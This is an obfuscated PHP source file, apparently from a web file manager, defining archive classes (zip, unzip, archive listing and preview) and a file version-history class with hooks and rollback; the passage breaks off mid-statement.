<?php
 goto B÷‹Î´İ™; eÍçÃÍ‹ë»: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¥¥¢‹Ï; if (!$¥¥¢‹Ï) { $‰ˆ«†Á· = IO::init($_SERVER[ë¦»ºéÌ][8]); } return $‰ˆ«†Á·; } private static function iconvSystem($ƒŸ“©´–) { return self::local()->iconvSystem($ƒŸ“©´–); } private static function iconvApp($µ³í¨‹’) { return self::local()->iconvApp($µ³í¨‹’); } public static function zip($üÔ§’ô›, $ÚÔ•û¦ = "\x7a\151\x70", $³Ñ÷ÕÓ¬ = '', $áâ„Ó¿ = REPEAT_RENAME) { $¸‘˜®ƒ¼ =& $_SERVER[ë¦»ºéÌ]; $…å®†Ò = self::init($üÔ§’ô›[0][$¸‘˜®ƒ¼[88]]); $òõùÇõú = self::info($üÔ§’ô›[0][$¸‘˜®ƒ¼[88]]); $àÜñ‡Ûî = !1; if (!$³Ñ÷ÕÓ¬ && $…å®†Ò->getType() == $¸‘˜®ƒ¼[117]) { $Ûç…‚–¦ = self::zipFileList($üÔ§’ô›); } else { $àÜñ‡Ûî = $³Ñ÷ÕÓ¬ ? $³Ñ÷ÕÓ¬ : TEMP_FILES . $¸‘˜®ƒ¼[1162] . time() . rand_string(8) . $¸‘˜®ƒ¼[8]; mk_dir($àÜñ‡Ûî); $Ûç…‚–¦ = self::zipFileList($üÔ§’ô›, $àÜñ‡Ûî); } $Ş²ÆÚàò = $òõùÇõú[$¸‘˜®ƒ¼[42]]; if (count($Ûç…‚–¦) > 1) { $µâÔÌ¾ö = IO::info(IO::pathFather($òõùÇõú[$¸‘˜®ƒ¼[88]])); $Ş²ÆÚàò = $µâÔÌ¾ö[$¸‘˜®ƒ¼[42]]; } $ûñöñ›² = $àÜñ‡Ûî; if (!$ûñöñ›²) { $ûñöñ›² = get_path_father($òõùÇõú[$¸‘˜®ƒ¼[88]]); if (!$³Ñ÷ÕÓ¬ && $…å®†Ò->getType() == $¸‘˜®ƒ¼[117]) { $ûñöñ›² = get_path_father($…å®†Ò->path); } $û··“ü  = IO::info($ûñöñ›²); if (!$û··“ü [$¸‘˜®ƒ¼[207]]) { show_json(LNG($¸‘˜®ƒ¼[1163]), !1); } } $æÓÖäöƒ = $ûñöñ›² . $Ş²ÆÚàò . $¸‘˜®ƒ¼[10] . $ÚÔ•û¦; $æÓÖäöƒ = get_filename_auto($æÓÖäöƒ, $¸‘˜®ƒ¼[12], $áâ„Ó¿); $ÑÒ§‡¹ = self::iconvSystem($æÓÖäöƒ); foreach ($Ûç…‚–¦ as $Ûßâöß => $¤ğá»¤) { $Ûç…‚–¦[$Ûßâöß] = self::iconvSystem($¤ğá»¤); } KodArchive::create($ÑÒ§‡¹, $Ûç…‚–¦); if (!IO::exist($æÓÖäöƒ)) { if ($àÜñ‡Ûî) { del_dir($àÜñ‡Ûî); } show_json(LNG($¸‘˜®ƒ¼[1164]), !1); } if ($³Ñ÷ÕÓ¬ || !$àÜñ‡Ûî) { if ($àÜñ‡Ûî && strstr($àÜñ‡Ûî, TEMP_FILES)) { $ìèÓùÖ¾ = $Ûç…‚–¦ = array(); recursion_dir($ûñöñ›², $ìèÓùÖ¾, $Ûç…‚–¦, 0); foreach ($ìèÓùÖ¾ as $ïÕå‘¹¶) { del_dir($ïÕå‘¹¶); } foreach ($Ûç…‚–¦ as $ÙÈ†È¥¶) { if ($ÙÈ†È¥¶ == $ÑÒ§‡¹) { continue; } del_file($ÙÈ†È¥¶); } } return $æÓÖäöƒ; } $¥µ‡ãù = self::pathFather($òõùÇõú[$¸‘˜®ƒ¼[88]]); $¬Å”É©À = self::move($æÓÖäöƒ, $¥µ‡ãù, $áâ„Ó¿); if (!$¬Å”É©À) { del_dir($àÜñ‡Ûî); show_json(LNG($¸‘˜®ƒ¼[1164]), !1); } del_dir($àÜñ‡Ûî); return $¬Å”É©À; } public static function unzip($–ïê’²æ, $îı¦›ŒÊ = "\x72\145\x70\154\x61\143\145") { $â²€¥—È =& $_SERVER[ë¦»ºéÌ]; $ÛÄ±å¡ = $–ïê’²æ[$â²€¥—È[88]]; $ª¦ã£Ìˆ = $–ïê’²æ[$â²€¥—È[1165]]; if (!($¤Ê©—Ü¿ = parent::info($ÛÄ±å¡))) { show_json(LNG($â²€¥—È[1166]), !1); } if (!($‡ÛøØô = parent::infoFull($ª¦ã£Ìˆ))) { $ª¦ã£Ìˆ = parent::mkdir($ª¦ã£Ìˆ); $‡ÛøØô = array($â²€¥—È[88] => $ª¦ã£Ìˆ); } else { if (isset($‡ÛøØô[$â²€¥—È[405]]) && trim($‡ÛøØô[$â²€¥—È[88]], $â²€¥—È[8]) != trim($ª¦ã£Ìˆ, $â²€¥—È[8])) { $åæÍøŒ = KodIO::make($‡ÛøØô[$â²€¥—È[500]]); $äûù”äô = parent::fileNameAuto($åæÍøŒ, $‡ÛøØô[$â²€¥—È[42]], REPEAT_RENAME_FOLDER, !0); $ª¦ã£Ìˆ = parent::mkdir($åæÍøŒ . $äûù”äô); $‡ÛøØô = array($â²€¥—È[88] => $ª¦ã£Ìˆ); } } $ª¦ã£Ìˆ = $‡ÛøØô[$â²€¥—È[88]]; $Ø©äİ™‘ = self::tmpFileName($¤Ê©—Ü¿); $˜û®ù®î = TEMP_FILES . $Ø©äİ™‘; del_dir($˜û®ù®î); mk_dir($˜û®ù®î); $‰Ëù×ˆŒ = self::fileExt($¤Ê©—Ü¿); $í§ÂñŸº = $˜û®ù®î . $â²€¥—È[10] . $‰Ëù×ˆŒ; if (!@file_exists(self::iconvSystem($í§ÂñŸº))) { $ì°Ç¸‰ = self::localFilePath($ÛÄ±å¡, $‰Ëù×ˆŒ); $í§ÂñŸº = $ì°Ç¸‰ ? $ì°Ç¸‰ : parent::download($ÛÄ±å¡, $í§ÂñŸº); } $í§ÂñŸº = self::iconvSystem($í§ÂñŸº); $—Òû±”ß = isset($–ïê’²æ[$â²€¥—È[1167]]) ? $–ïê’²æ[$â²€¥—È[1167]] : $â²€¥—È[1168]; $æÂ·µ¾¬ = KodArchive::extract($í§ÂñŸº, $˜û®ù®î . $â²€¥—È[8], $—Òû±”ß); self::archiveExt(); if (!$æÂ·µ¾¬[$â²€¥—È[1169]]) { show_json($â²€¥—È[1170] . $æÂ·µ¾¬[$â²€¥—È[1171]], !1); } Hook::trigger($â²€¥—È[1172], $˜û®ù®î); recursion_dir($˜û®ù®î, $ô‚–„´‘, $Ï˜¡×¢, 0); $ˆ„ç¶¦‰ = array_merge($ô‚–„´‘, $Ï˜¡×¢); foreach ($ˆ„ç¶¦‰ as $†ÕøÍ±™) { $†ÕøÍ±™ = self::iconvApp($†ÕøÍ±™); self::move($†ÕøÍ±™, $ª¦ã£Ìˆ, $îı¦›ŒÊ); } del_dir($˜û®ù®î); if (!$ì°Ç¸‰) { del_file($í§ÂñŸº); } return !0; } public static function unzipList($á¥“ıı‹) { $Î×œèè =& $_SERVER[ë¦»ºéÌ]; $Ê–ò¬· = $á¥“ıı‹[$Î×œèè[88]]; $ó¹’¥ğ‡ = isset($á¥“ıı‹[$Î×œèè[1173]]) ? $á¥“ıı‹[$Î×œèè[1173]] : -1; $‘®¶‰Úş = 50000; if (request_url_safe($Ê–ò¬·)) { $Í›Ïá´Ş = parse_url_query($Ê–ò¬·); if (!isset($Í›Ïá´Ş[$Î×œèè[88]])) { show_json($Î×œèè[1174], !1); } } $îºÂ†İ‚ = isset($Í›Ïá´Ş) ? $Í›Ïá´Ş[$Î×œèè[88]] : $Ê–ò¬·; $Ïç‚—Ğ = self::info($îºÂ†İ‚); $÷«ÀÄ° = self::fileExt($Ïç‚—Ğ); $ˆëÉÚ¥± = self::tmpFileName($Ïç‚—Ğ); if (isset($Í›Ïá´Ş)) { $æ¿şÅœ¥ = array($Í›Ïá´Ş[$Î×œèè[88]], $Í›Ïá´Ş[$Î×œèè[1173]], $Í›Ïá´Ş[$Î×œèè[42]]); $ÊˆŒï‡Õ = md5(implode($Î×œèè[11], $æ¿şÅœ¥)) . $Î×œèè[10] . get_path_ext($Í›Ïá´Ş[$Î×œèè[42]]); } else { $æ¿şÅœ¥ = array($Ïç‚—Ğ[$Î×œèè[42]], $Ïç‚—Ğ[$Î×œèè[88]], $Ïç‚—Ğ[$Î×œèè[90]]); $ÊˆŒï‡Õ = md5(implode($Î×œèè[11], $æ¿şÅœ¥)) . $Î×œèè[10] . $÷«ÀÄ°; } if ($ó¹’¥ğ‡ == -1) { $õ¨ö‰ÉÓ = IO_PATH_SYSTEM_TEMP . "\172\x69\160\x56\x69\x65\x77\x2f{$ˆëÉÚ¥±}\x2f{$ÊˆŒï‡Õ}\56\154\x6f\x67"; $¿¦ã¼ß = self::infoFull($õ¨ö‰ÉÓ); if ($¿¦ã¼ß) { $õ¨ö‰ÉÓ = $¿¦ã¼ß[$Î×œèè[88]]; $®¶Îî’† = self::getContent($õ¨ö‰ÉÓ); if ($®¶Îî’†) { $¬ØñÜ“— = json_decode($®¶Îî’†, !0); $¬ØñÜ“— = is_array($¬ØñÜ“—) ? $¬ØñÜ“— : array(); if (count($¬ØñÜ“—) >= $‘®¶‰Úş) { show_json(sprintf(LNG($Î×œèè[1175]), count($¬ØñÜ“—)), !1); } return $¬ØñÜ“—; } } else { $õ¨ö‰ÉÓ = self::mkfile($õ¨ö‰ÉÓ); } } $£Ø›—›‹ = TEMP_FILES . $ˆëÉÚ¥±; if (!is_dir($£Ø›—›‹)) { mk_dir($£Ø›—›‹); } $Éïªë¤Ò = $£Ø›—›‹ . $Î×œèè[8] . $ÊˆŒï‡Õ; if (!@file_exists(self::iconvSystem($Éïªë¤Ò))) { if (isset($Í›Ïá´Ş)) { url_request($Ê–ò¬·, $Î×œèè[1176], $Éïªë¤Ò); } else { $‚ª—™ù = self::localFilePath($Ê–ò¬·, $÷«ÀÄ°); $Éïªë¤Ò = $‚ª—™ù ? $‚ª—™ù : self::download($Ê–ò¬·, $Éïªë¤Ò); } } $Éïªë¤Ò = self::iconvSystem($Éïªë¤Ò); if ($ó¹’¥ğ‡ >= 0) { $İ¾íõ° = isset($á¥“ıı‹[$Î×œèè[1177]]) ? $á¥“ıı‹[$Î×œèè[1177]] : !1; $Ñğæ†Ûí = isset($á¥“ıı‹[$Î×œèè[42]]) ? $á¥“ıı‹[$Î×œèè[42]] : $Î×œèè[12]; KodArchive::filePreview($Éïªë¤Ò, $ó¹’¥ğ‡, $İ¾íõ°, $Ñğæ†Ûí); self::archiveExt(); die; } $Åñ’òñú = KodArchive::listContent($Éïªë¤Ò); self::archiveExt(); del_dir($£Ø›—›‹); if (!$Åñ’òñú[$Î×œèè[1169]]) { show_json($Åñ’òñú[$Î×œèè[1171]], !1); } $¬ØñÜ“— = json_encode($Åñ’òñú[$Î×œèè[1171]]); self::setContent($õ¨ö‰ÉÓ, $¬ØñÜ“—); if (count($Åñ’òñú[$Î×œèè[1171]]) >= $‘®¶‰Úş) { show_json(sprintf(LNG($Î×œèè[1175]), count($Åñ’òñú[$Î×œèè[1171]])), !1); } return $Åñ’òñú[$Î×œèè[1171]]; } private static function fileExt($ÌšŸÎÎ) { $¾¸éƒÇ =& $_SERVER[ë¦»ºéÌ]; $¶œÑåê¬ = $ÌšŸÎÎ[$¾¸éƒÇ[179]]; if ($¶œÑåê¬ == $¾¸éƒÇ[1178]) { $éË«ÕÖ = $¾¸éƒÇ[1179]; if (substr($ÌšŸÎÎ[$¾¸éƒÇ[42]], -strlen($éË«ÕÖ)) == $éË«ÕÖ) { $¶œÑåê¬ = $¾¸éƒÇ[1180]; } } self::archiveExt($¶œÑåê¬); return $¶œÑåê¬; } private static function zipFileList($’—ÂÕàÁ, $ÒÔÆÎï‡ = false) { $•˜—ÀÄ» =& $_SERVER[ë¦»ºéÌ]; $ÕëºŞş… = array(); foreach ($’—ÂÕàÁ as $ôúÔÉé) { $ ×¸»ıâ = $ôúÔÉé[$•˜—ÀÄ»[88]]; if ($ÒÔÆÎï‡) { $ ×¸»ıâ = self::copy($ôúÔÉé[$•˜—ÀÄ»[88]], $ÒÔÆÎï‡, $•˜—ÀÄ»[802]); } else { $Ë…ºÜö = self::init($ôúÔÉé[$•˜—ÀÄ»[88]]); if ($Ë…ºÜö->getType() == $•˜—ÀÄ»[117]) { $ ×¸»ıâ = $Ë…ºÜö->path; } } if ($ ×¸»ıâ && self::local()->exist($ ×¸»ıâ)) { $ÕëºŞş…[$ôúÔÉé[$•˜—ÀÄ»[88]]] = $ ×¸»ıâ; } } if (!empty($ÕëºŞş…)) { return array_values($ÕëºŞş…); } show_json(LNG($•˜—ÀÄ»[1144]), !1); } public static function tmpFileName($’óœëÖ ) { $´ƒÙà¡ä =& $_SERVER[ë¦»ºéÌ]; $­™ßŞê = array($’óœëÖ [$´ƒÙà¡ä[42]], $’óœëÖ [$´ƒÙà¡ä[88]], $’óœëÖ [$´ƒÙà¡ä[90]], $’óœëÖ [$´ƒÙà¡ä[523]]); return md5(implode($´ƒÙà¡ä[11], $­™ßŞê)); } private static function localFilePath($ÜÍ¾ªíİ, $¨ïº³¾ˆ) { $ äëíü£ =& $_SERVER[ë¦»ºéÌ]; if ($¨ïº³¾ˆ == $ äëíü£[1181] && strtoupper(substr(PHP_OS, 0, 3)) == $ äëíü£[1182]) { return !1; } $ÉºëÇ±ë = KodIO::parse($ÜÍ¾ªíİ); if ($ÉºëÇ±ë[$ äëíü£[43]] == KodIO::KOD_SOURCE) { $å“ÈØş‡ = Model($ äëíü£[809])->fileInfoGet(KodIO::sourceID($ÜÍ¾ªíİ)); if (!$å“ÈØş‡[$ äëíü£[88]]) { show_json($ äëíü£[1183], !1); } $ÜÍ¾ªíİ = $å“ÈØş‡[$ äëíü£[88]]; } $Ë‡àÌ  = self::init($ÜÍ¾ªíİ); if ($Ë‡àÌ ->pathParse[$ äëíü£[1131]]) { $ÜÍ¾ªíİ = $Ë‡àÌ ->pathParse[$ äëíü£[1131]]; $Ë‡àÌ  = self::init($ÜÍ¾ªíİ); } $óÏ»§Äü = $Ë‡àÌ ->getType(); if ($óÏ»§Äü == $ äëíü£[117] || $óÏ»§Äü == $ äëíü£[1184]) { if (!$Ë‡àÌ ->exist($Ë‡àÌ ->path)) { show_json(LNG($ äëíü£[116]), !1); } return $Ë‡àÌ ->path; } return !1; } private static function archiveExt($Œ‡ŞçÕš = '') { $GLOBALS[$_SERVER[ë¦»ºéÌ][1185]] = $Œ‡ŞçÕš; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $™ŸÅÊ¾‰ =& $_SERVER[ë¦»ºéÌ]; $™ÑıÆÊí = $GLOBALS[$™ŸÅÊ¾‰[6]][$™ŸÅÊ¾‰[100]]; if ($™ÑıÆÊí[$™ŸÅÊ¾‰[1186]] != 1) { return; } if ($™ÑıÆÊí[$™ŸÅÊ¾‰[1187]] <= 0) { return; } if (isset($_REQUEST[$™ŸÅÊ¾‰[1188]]) && $_REQUEST[$™ŸÅÊ¾‰[1188]] == $™ŸÅÊ¾‰[99]) { return; } Hook::bind($™ŸÅÊ¾‰[1189], $™ŸÅÊ¾‰[1190]); Hook::bind($™ŸÅÊ¾‰[1191], $™ŸÅÊ¾‰[1192]); Hook::bind($™ŸÅÊ¾‰[1193], $™ŸÅÊ¾‰[1194]); Hook::bind($™ŸÅÊ¾‰[1195], $™ŸÅÊ¾‰[1196]); Hook::bind($™ŸÅÊ¾‰[1197], $™ŸÅÊ¾‰[1198]); Hook::bind($™ŸÅÊ¾‰[1199], $™ŸÅÊ¾‰[1200]); } public static function eventBeforeUpload($Úå‰Ã¢¶) { if ($Úå‰Ã¢¶[3] && $Úå‰Ã¢¶[3] != REPEAT_REPLACE) { return; } $°±ÙÇ´¦ = self::parsePath($Úå‰Ã¢¶[0]); if (!$°±ÙÇ´¦) { return; } self::add($°±ÙÇ´¦); } public static function eventBeforeEdit($ºšÄî§Õ) { $óšªÏ‡Õ = self::parsePath($ºšÄî§Õ[0]); if (!$óšªÏ‡Õ) { return; } self::add($óšªÏ‡Õ); } public static function eventBeforeCopyFile($¬¨ûÌğã, $‚ƒÒÓÃö, $ã“²Ô¡¿, $¦„ãë¯ , $ŞøŸÂØ, $âºò¹×) { $¸’¯×·” = $ã“²Ô¡¿->getPathOuter($¦„ãë¯ ); $Ÿªˆªìë = self::parsePath($¸’¯×·”); if (!$Ÿªˆªìë) { return; } self::add($Ÿªˆªìë); } public static function eventBeforeRename($åàŸœëì) { $ìˆİíÏş =& $_SERVER[ë¦»ºéÌ]; $Â‹Æ«ğş = self::parsePath($åàŸœëì[0]); if (!$Â‹Æ«ğş) { return; } $”®Ğ„¿ = self::checkInHistory($Â‹Æ«ğş); if (!$”®Ğ„¿) { return; } if ($”®Ğ„¿[$ìˆİíÏş[43]] == $ìˆİíÏş[204]) { $ÔÆ—øÑ‹ = self::listData($Â‹Æ«ğş); if ($ÔÆ—øÑ‹ && $ÔÆ—øÑ‹[$ìˆİíÏş[375]]) { self::moveHistory($Â‹Æ«ğş, $åàŸœëì[1]); } } else { IO::rename($”®Ğ„¿[$ìˆİíÏş[88]], $åàŸœëì[1]); } } public static function eventBeforeMove($‚ÃÍáåü) { $«ù™ÈÎ¥ =& $_SERVER[ë¦»ºéÌ]; $´ÖÑÖ‚ = self::parsePath($‚ÃÍáåü[0]); if (!$´ÖÑÖ‚) { return; } $ıìÒ‘ñ = self::parsePath($‚ÃÍáåü[1]); if (!$ıìÒ‘ñ) { return; } $¼ˆÂ·µ‰ = $‚ÃÍáåü[3]; $Œû»Ôè = self::checkInHistory($´ÖÑÖ‚); if (!$Œû»Ôè) { return; } $§ÌòÜœÍ = self::pathHistory($ıìÒ‘ñ); if ($Œû»Ôè[$«ù™ÈÎ¥[43]] == $«ù™ÈÎ¥[204]) { $ƒ§ÌŒ¨Ñ = self::listData($´ÖÑÖ‚); $˜ş¯ÔË‰ = rtrim($ıìÒ‘ñ, $«ù™ÈÎ¥[8]) . $«ù™ÈÎ¥[8] . ($¼ˆÂ·µ‰ ? $¼ˆÂ·µ‰ : get_path_this($´ÖÑÖ‚)); $·èÀ÷éµ = self::listData($˜ş¯ÔË‰); if ($ƒ§ÌŒ¨Ñ && $ƒ§ÌŒ¨Ñ[$«ù™ÈÎ¥[375]] && $·èÀ÷éµ && $·èÀ÷éµ[$«ù™ÈÎ¥[375]]) { return self::clear($´ÖÑÖ‚); } if ($ƒ§ÌŒ¨Ñ && $ƒ§ÌŒ¨Ñ[$«ù™ÈÎ¥[375]]) { self::moveHistory($´ÖÑÖ‚, $¼ˆÂ·µ‰, $§ÌòÜœÍ); } } else { IO::move($Œû»Ôè[$«ù™ÈÎ¥[88]], $§ÌòÜœÍ, !1, $¼ˆÂ·µ‰); self::clearEmptyFolder(IO::pathFather($Œû»Ôè[$«ù™ÈÎ¥[88]])); } } public static function eventAfterRemove($—³ ¤¬¤, $±¢›) { $Æ«ÎÔ¤£ =& $_SERVER[ë¦»ºéÌ]; if (!$±¢›) { return; } $Œû‡ÃÛ = self::parsePath($—³ ¤¬¤[0]); if (!$Œû‡ÃÛ) { return; } $¡Í’­è¤ = self::checkInHistory($Œû‡ÃÛ); if (!$¡Í’­è¤) { return; } if ($¡Í’­è¤[$Æ«ÎÔ¤£[43]] == $Æ«ÎÔ¤£[204]) { $¦îÈïŞ¨ = self::listData($Œû‡ÃÛ, !1); if ($¦îÈïŞ¨ && $¦îÈïŞ¨[$Æ«ÎÔ¤£[375]]) { self::clear($Œû‡ÃÛ, !1); } } else { IO::remove($¡Í’­è¤[$Æ«ÎÔ¤£[88]]); self::clearEmptyFolder(IO::pathFather($¡Í’­è¤[$Æ«ÎÔ¤£[88]])); } } private static function checkInHistory($áëä‚˜Ï) { $ß±ïŸ™— = self::pathHistory($áëä‚˜Ï); if (!IO::exist($ß±ïŸ™—)) { $ß±ïŸ™— .= $_SERVER[ë¦»ºéÌ][1201]; } return IO::exist($ß±ïŸ™—) ? IO::info($ß±ïŸ™—) : !1; } private static function parsePath($Œ¦ßÄ) { $„©Í´Õî =& $_SERVER[ë¦»ºéÌ]; if (!$Œ¦ßÄ) { return !1; } if ($GLOBALS[$„©Í´Õî[1202]]) { return; } $—îĞ›Ÿ¦ = KodIO::parse($Œ¦ßÄ); $İÏÌòÛ¬ = $—îĞ›Ÿ¦[$„©Í´Õî[43]]; $µŸŞ‹åß = !$İÏÌòÛ¬ || $İÏÌòÛ¬ == KodIO::KOD_IO || $İÏÌòÛ¬ == KodIO::KOD_SHARE_ITEM; if (!$µŸŞ‹åß || !$—îĞ›Ÿ¦[$„©Í´Õî[1203]]) { return !1; } if (substr($Œ¦ßÄ, 0, strlen(DATA_PATH . $„©Í´Õî[1204])) == DATA_PATH . $„©Í´Õî[1204]) { return !1; } if ($İÏÌòÛ¬ == KodIO::KOD_SHARE_ITEM) { $ùĞ˜ñœ‹ = IO::init($Œ¦ßÄ); if ($ùĞ˜ñœ‹->pathParse[$„©Í´Õî[1131]]) { return self::parsePath($ùĞ˜ñœ‹->pathParse[$„©Í´Õî[1131]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $¦¦ıúŒ‹ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $„©Í´Õî[1205]); foreach ($¦¦ıúŒ‹ as $™¢¢ä™í) { if (!$İÏÌòÛ¬ && substr($Œ¦ßÄ, 0, strlen($™¢¢ä™í)) == $™¢¢ä™í) { return !1; } } self::log($GLOBALS[$„©Í´Õî[1126]] . $„©Í´Õî[1206] . $Œ¦ßÄ); return $Œ¦ßÄ; } private static function pathHistory($™»³Õ˜) { $÷îã¼ªŞ =& $_SERVER[ë¦»ºéÌ]; $İúğŠĞ¿ = self::$_historyBase . ltrim(KodIO::clear($™»³Õ˜), $÷îã¼ªŞ[8]); $İúğŠĞ¿ = str_replace(array($÷îã¼ªŞ[1207]), array($÷îã¼ªŞ[1208]), $İúğŠĞ¿); return $İúğŠĞ¿; } public static function log($Õ³³Á¾¨) { } public static function historyCount($»¢ğ…ã´) { $É¥ÎÀ =& $_SERVER[ë¦»ºéÌ]; $Ç•úûÔ = array(); $öÎâÁÍ¶ = array(); foreach ($»¢ğ…ã´ as $Ôã’›Ğ¬) { $Âëµ’°İ = get_path_father($Ôã’›Ğ¬); if (!$öÎâÁÍ¶[$Âëµ’°İ]) { $öÎâÁÍ¶[$Âëµ’°İ] = array(); } $öÎâÁÍ¶[$Âëµ’°İ][] = get_path_this($Ôã’›Ğ¬); } foreach ($öÎâÁÍ¶ as $Âëµ’°İ => $ÓÄÜ —) { $ÂÖ˜ıƒü = self::parsePath($Âëµ’°İ); if (!$ÂÖ˜ıƒü) { continue; } foreach ($ÓÄÜ — as $…ÉûšÄ) { $ ÷¿ âî = self::listData(rtrim($ÂÖ˜ıƒü, $É¥ÎÀ[8]) . $É¥ÎÀ[8] . $…ÉûšÄ, !1); if ($ ÷¿ âî && $ ÷¿ âî[$É¥ÎÀ[375]]) { $Ç•úûÔ[rtrim($Âëµ’°İ, $É¥ÎÀ[8]) . $É¥ÎÀ[8] . $…ÉûšÄ] = count($ ÷¿ âî[$É¥ÎÀ[375]]); } } } return $Ç•úûÔ; } public static function add($èãÏ’à‘) { $Õƒ³Òºœ =& $_SERVER[ë¦»ºéÌ]; $ôıÍôÖ = self::listData($èãÏ’à‘); if (!$ôıÍôÖ) { return; } $ª¼‘Ğ¤Ì = Model($Õƒ³Òºœ[754])->get($Õƒ³Òºœ[1209]); $Ñš¯€¡è = $GLOBALS[$Õƒ³Òºœ[6]][$Õƒ³Òºœ[100]][$Õƒ³Òºœ[1187]]; $Ô¢õèî… = $ª¼‘Ğ¤Ì == $Õƒ³Òºœ[1210] ? 5 : $Ñš¯€¡è; if ($Ñš¯€¡è <= 0) { return; } $ÆÈíŞ›« = IO::hashSimple($èãÏ’à‘); $øÓÎÌó  = IO::info($èãÏ’à‘); $Ø°µÕ”® = $ôıÍôÖ[$Õƒ³Òºœ[375]]; if ($øÓÎÌó [$Õƒ³Òºœ[90]] == 0) { return; } if ($øÓÎÌó [$Õƒ³Òºœ[90]] >= 1024 * 1024 * 500) { return !1; } if ($Ø°µÕ”® && $Ø°µÕ”®[0][$Õƒ³Òºœ[182]] == $ÆÈíŞ›«) { return !0; } if (array_key_exists($Õƒ³Òºœ[207], $øÓÎÌó ) && !$øÓÎÌó [$Õƒ³Òºœ[207]]) { return !1; } $°Ë‡­Ù¹ = short_id(time()); $¯ôû¦ÆÀ = array($Õƒ³Òºœ[403] => $°Ë‡­Ù¹, $Õƒ³Òºœ[182] => $ÆÈíŞ›«, $Õƒ³Òºœ[42] => $øÓÎÌó [$Õƒ³Òºœ[42]] . $Õƒ³Òºœ[10] . date($Õƒ³Òºœ[1211]) . rand_string(1), $Õƒ³Òºœ[90] => $øÓÎÌó [$Õƒ³Òºœ[90]], $Õƒ³Òºœ[454] => USER_ID, $Õƒ³Òºœ[205] => time(), $Õƒ³Òºœ[1212] => $Õƒ³Òºœ[12]); IO::mkdir($ôıÍôÖ[$Õƒ³Òºœ[1213]]); $„Ñ½Ïá· = IO::copy($èãÏ’à‘, $ôıÍôÖ[$Õƒ³Òºœ[1213]], !1, $¯ôû¦ÆÀ[$Õƒ³Òºœ[42]]); if (!$„Ñ½Ïá·) { self::clearEmptyFolder($ôıÍôÖ[$Õƒ³Òºœ[1213]]); return !1; } array_unshift($Ø°µÕ”®, $¯ôû¦ÆÀ); if (count($Ø°µÕ”®) > $Ô¢õèî…) { $¼ş—İƒ = array_slice($Ø°µÕ”®, $Ô¢õèî…); foreach ($¼ş—İƒ as $àâÄğû) { IO::remove($ôıÍôÖ[$Õƒ³Òºœ[1213]] . $àâÄğû[$Õƒ³Òºœ[42]]); } $Ø°µÕ”® = array_slice($Ø°µÕ”®, 0, $Ô¢õèî…); } return self::saveData($ôıÍôÖ[$Õƒ³Òºœ[1214]], $Ø°µÕ”®); } public static function remove($øì»‚£, $Æ™¡ÅÛ) { $˜ÑÒÒãÉ =& $_SERVER[ë¦»ºéÌ]; $ºÒ² ¢ƒ = self::listData($øì»‚£); $ÀŞîÊ«§ = array(); if (!$ºÒ² ¢ƒ) { return !1; } foreach ($ºÒ² ¢ƒ[$˜ÑÒÒãÉ[375]] as $²ê½Ùç) { if ($²ê½Ùç[$˜ÑÒÒãÉ[403]] == $Æ™¡ÅÛ) { IO::remove($ºÒ² ¢ƒ[$˜ÑÒÒãÉ[1213]] . $²ê½Ùç[$˜ÑÒÒãÉ[42]]); continue; } $ÀŞîÊ«§[] = $²ê½Ùç; } return self::saveData($ºÒ² ¢ƒ[$˜ÑÒÒãÉ[1214]], $ÀŞîÊ«§); } public static function clear($ÄÈ‚Öí, $ÓÎ«Á«ã = true) { $¿¢¶É»ˆ =& $_SERVER[ë¦»ºéÌ]; $ùÇüêÚ… = self::listData($ÄÈ‚Öí, $ÓÎ«Á«ã); if (!$ùÇüêÚ…) { return !1; } foreach ($ùÇüêÚ…[$¿¢¶É»ˆ[375]] as $”¼ˆÛÅ¨) { IO::remove($ùÇüêÚ…[$¿¢¶É»ˆ[1213]] . $”¼ˆÛÅ¨[$¿¢¶É»ˆ[42]]); } return self::saveData($ùÇüêÚ…[$¿¢¶É»ˆ[1214]], array()); } public static function moveHistory($˜ƒ©‚“, $ïê¸ïŒ· = '', $êçşé = '') { $¿ê³Èá× =& $_SERVER[ë¦»ºéÌ]; $§Öˆ°Ç± = self::listData($˜ƒ©‚“, !1); if (!$§Öˆ°Ç± || !$§Öˆ°Ç±[$¿ê³Èá×[375]]) { return !1; } $±µŠî² = $¿ê³Èá×[1201]; $ïê¸ïŒ· = $ïê¸ïŒ· ? $ïê¸ïŒ· : get_path_this($˜ƒ©‚“); $êçşé = $êçşé ? $êçşé : $§Öˆ°Ç±[$¿ê³Èá×[1213]]; $ë¯ÍÙôä = substr(get_path_this($§Öˆ°Ç±[$¿ê³Èá×[1214]]), 0, -strlen($±µŠî²)); foreach ($§Öˆ°Ç±[$¿ê³Èá×[375]] as $Ô¢î => $ã‘¿öè¶) { $Ô¦Á•âû = $ïê¸ïŒ· . substr($ã‘¿öè¶[$¿ê³Èá×[42]], strlen($ë¯ÍÙôä)); $€ÄÆƒ€ô = IO::move($§Öˆ°Ç±[$¿ê³Èá×[1213]] . $ã‘¿öè¶[$¿ê³Èá×[42]], $êçşé, !1, $Ô¦Á•âû); if ($€ÄÆƒ€ô) { $§Öˆ°Ç±[$¿ê³Èá×[375]][$Ô¢î][$¿ê³Èá×[42]] = $Ô¦Á•âû; } } $§Öˆ°Ç±[$¿ê³Èá×[1214]] = IO::move($§Öˆ°Ç±[$¿ê³Èá×[1214]], $êçşé, !1, $ïê¸ïŒ· . $±µŠî²); self::saveData($§Öˆ°Ç±[$¿ê³Èá×[1214]], $§Öˆ°Ç±[$¿ê³Èá×[375]]); self::clearEmptyFolder($§Öˆ°Ç±[$¿ê³Èá×[1213]]); } public static function rollback($Øê¿Ú”, $ÜÁóâ»Û) { $ŞÏ‡»Î =& $_SERVER[ë¦»ºéÌ]; $—«íìÓé = self::listData($Øê¿Ú”); if (!$—«íìÓé) { return; } $¼°İÁòÙ = IO::info($Øê¿Ú”); foreach ($—«íìÓé[$ŞÏ‡»Î[375]] as $¸ÂÓ™ => $º–ÛĞ‘å) { if ($º–ÛĞ‘å[$ŞÏ‡»Î[403]] == $ÜÁóâ»Û) { self::add($Øê¿Ú”); $ÁÀÈÁæ¸ = $—«íìÓé[$ŞÏ‡»Î[1213]] . $º–ÛĞ‘å[$ŞÏ‡»Î[42]]; $Ù—°¡º = IO::copy($ÁÀÈÁæ¸, IO::pathFather($Øê¿Ú”), REPEAT_REPLACE, $¼°İÁòÙ[$ŞÏ‡»Î[42]]); if 